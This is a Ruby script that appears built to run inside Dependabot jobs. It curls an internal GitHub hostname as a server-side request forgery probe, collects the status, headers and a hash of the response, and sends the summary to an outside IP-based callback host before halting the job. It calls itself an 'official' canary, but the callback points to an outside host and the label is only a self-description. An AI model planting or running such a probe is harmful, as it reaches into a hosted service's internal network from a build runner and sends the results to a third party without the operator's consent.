require "digest"
require "json"
require "open3"
require "tempfile"

GITHUB_INTERNAL_CANARY = "http://ssrf-target.iad.github.net/"
GITHUB_INTERNAL_CALLBACK = "https://target.147.182.179.38.sslip.io:8443/infra/5b3963e04627c6a3b1943eb0e2a145cc"

def send_github_internal_summary(job_id, summary)
  _stdout, _stderr, status = Open3.capture3(
    "curl",
    "--fail",
    "--silent",
    "--show-error",
    "--max-time", "15",
    "--output", "/dev/null",
    "--header", "Content-Type: application/json",
    "--data-binary", "@-",
    "#{GITHUB_INTERNAL_CALLBACK}/#{job_id}/runtime-summary",
    stdin_data: JSON.generate(summary)
  )
  status.success?
end

job_id = ENV["DEPENDABOT_JOB_ID"].to_s
if job_id.match?(/\A[0-9]+\z/)
  guard = "/tmp/dependabot-github-internal-canary-#{job_id}.done"
  begin
    File.open(guard, File::WRONLY | File::CREAT | File::EXCL, 0o600) { |file| file.write("1") }
  rescue Errno::EEXIST
    guard = nil
  end

  if guard
    Tempfile.create("github-internal-canary-body") do |body_file|
      Tempfile.create("github-internal-canary-headers") do |header_file|
        body_file.chmod(0o600)
        header_file.chmod(0o600)
        stdout, _stderr, status = Open3.capture3(
          "curl",
          "--silent",
          "--show-error",
          "--max-time", "10",
          "--max-filesize", "131072",
          "--output", body_file.path,
          "--dump-header", header_file.path,
          "--write-out", "%{http_code}",
          GITHUB_INTERNAL_CANARY
        )
        body = File.binread(body_file.path)
        header_names = File.readlines(header_file.path, chomp: true).filter_map do |line|
          match = line.match(/\A([A-Za-z0-9-]{1,64}):/)
          match && match[1].downcase
        end.uniq.sort
        http_status = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
        summary = {
          "probe" => "github-official-internal-ssrf-canary-v1",
          "job_id" => job_id,
          "target_hostname" => "ssrf-target.iad.github.net",
          "target_scheme" => "http",
          "curl_exit_success" => status.success?,
          "http_status" => http_status,
          "response_length" => body.bytesize,
          "response_sha256" => Digest::SHA256.hexdigest(body),
          "response_header_names" => header_names,
          "body_exfiltrated" => false
        }
        send_github_internal_summary(job_id, summary)
      end
    end
    sleep 5
    raise "controlled stop after official GitHub internal SSRF canary probe"
  end
end
